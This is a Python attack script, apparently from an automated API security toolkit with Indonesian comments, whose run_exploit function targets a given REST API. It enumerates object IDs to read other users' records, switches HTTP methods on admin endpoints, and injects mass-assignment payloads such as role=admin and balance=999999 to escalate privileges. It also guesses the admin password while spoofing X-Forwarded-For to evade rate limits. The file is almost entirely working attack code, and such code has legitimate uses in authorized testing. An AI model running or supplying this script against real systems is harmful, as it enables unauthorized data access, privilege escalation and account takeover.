"""
Ouroboros Code Blueprint: BOLA/IDOR & Mass Assignment
=====================================================
Kategori : API Security — Broken Object Level Authorization & Mass Assignment
Tingkat  : Intermediate-Advanced
Teknik   : ID enumeration, HTTP method switching, parameter injection, mass assignment
"""

def run_exploit(target_url):
    """
    Blueprint untuk API Security Testing: BOLA/IDOR dan Mass Assignment.
    Mencoba berbagai teknik bypass authorization pada RESTful APIs.
    """
    import requests
    import json

    session = requests.Session()
    findings = []

    # ---- Setup: login sebagai user biasa terlebih dahulu ----
    try:
        r_login = session.post(f"{target_url}/api/login",
                              json={"username": "guest", "password": "guest"},
                              timeout=5)
        if r_login.status_code == 200:
            data = r_login.json()
            token = data.get("token") or data.get("access_token", "")
            session.headers.update({"Authorization": f"Bearer {token}"})
    except Exception:
        pass

    # ---- Teknik 1: BOLA - ID Enumeration ----
    # Coba berbagai endpoint dengan ID yang berbeda
    api_patterns = [
        "/api/users/{id}",
        "/api/orders/{id}",
        "/api/invoices/{id}",
        "/api/documents/{id}",
        "/api/profiles/{id}",
        "/api/accounts/{id}",
        "/api/admin/users/{id}",
    ]

    current_user_id = None
    try:
        r_me = session.get(f"{target_url}/api/me", timeout=5)
        if r_me.status_code == 200:
            current_user_id = r_me.json().get("id", 1)
    except Exception:
        current_user_id = 1

    # Coba ID adjacency (user kita +/- 1, 2, 3)
    for pattern in api_patterns:
        for id_delta in [-3, -2, -1, 2, 3, 100, 999]:
            test_id = (current_user_id or 1) + id_delta
            endpoint = f"{target_url}{pattern.format(id=test_id)}"
            try:
                r = session.get(endpoint, timeout=5)
                if r.status_code == 200 and len(r.text) > 10:
                    data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
                    if data:
                        findings.append(f"BOLA: Akses data user {test_id} berhasil via {endpoint}")
                        if len(findings) >= 3:
                            return {
                                "status": "COMPROMISED",
                                "details": "BOLA/IDOR ditemukan! " + "; ".join(findings[:3])
                            }
            except Exception:
                continue

    # ---- Teknik 2: HTTP Method Switching ----
    protected_endpoints = [
        f"{target_url}/api/admin/users",
        f"{target_url}/api/admin",
        f"{target_url}/api/config",
    ]
    for ep in protected_endpoints:
        for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]:
            try:
                r = session.request(method, ep, timeout=5)
                if r.status_code == 200 and "admin" in r.text.lower():
                    findings.append(f"HTTP Method Switching: {method} {ep} → 200!")
            except Exception:
                continue

    # ---- Teknik 3: Mass Assignment ----
    # Coba tambah field sensitif ke request update profil
    mass_assign_payloads = [
        {"role": "admin", "is_admin": True, "verified": True, "balance": 999999},
        {"role": "administrator", "subscription": "premium", "credits": 10000},
        {"admin": True, "superuser": True, "privilege_level": 9},
        {"group": "admin", "permissions": ["read", "write", "admin"]},
    ]

    update_endpoints = [
        (f"{target_url}/api/users/{current_user_id}", "PUT"),
        (f"{target_url}/api/profile", "PUT"),
        (f"{target_url}/api/me", "PATCH"),
        (f"{target_url}/api/register", "POST"),
    ]

    for endpoint, method in update_endpoints:
        for payload in mass_assign_payloads:
            try:
                payload_with_base = {"name": "Test User", **payload}
                r = session.request(method, endpoint, json=payload_with_base, timeout=5)
                if r.status_code in [200, 201]:
                    # Verifikasi apakah mass assignment berhasil
                    r_check = session.get(f"{target_url}/api/me", timeout=5)
                    if r_check.status_code == 200:
                        user_data = r_check.json()
                        for key, value in payload.items():
                            if str(user_data.get(key, "")).lower() == str(value).lower():
                                return {
                                    "status": "COMPROMISED",
                                    "details": f"Mass Assignment berhasil! Field '{key}' diset ke '{value}' via {method} {endpoint}"
                                }
            except Exception:
                continue

    # ---- Teknik 4: Rate Limiting Bypass ----
    rate_limit_endpoint = f"{target_url}/api/login"
    bypass_headers = [
        {"X-Forwarded-For": f"10.0.0.{i}"} for i in range(1, 10)
    ]
    success_count = 0
    for i, headers in enumerate(bypass_headers):
        try:
            r = session.post(rate_limit_endpoint,
                           json={"username": "admin", "password": f"guess{i}"},
                           headers=headers, timeout=3)
            if r.status_code != 429:
                success_count += 1
        except Exception:
            continue

    if success_count >= 5:
        findings.append(f"Rate Limiting Bypass berhasil! {success_count}/9 request lolos via X-Forwarded-For rotation")

    if findings:
        return {"status": "COMPROMISED", "details": "; ".join(findings)}
    return {"status": "FAILED", "details": "Tidak ada kerentanan API yang berhasil dieksploitasi."}
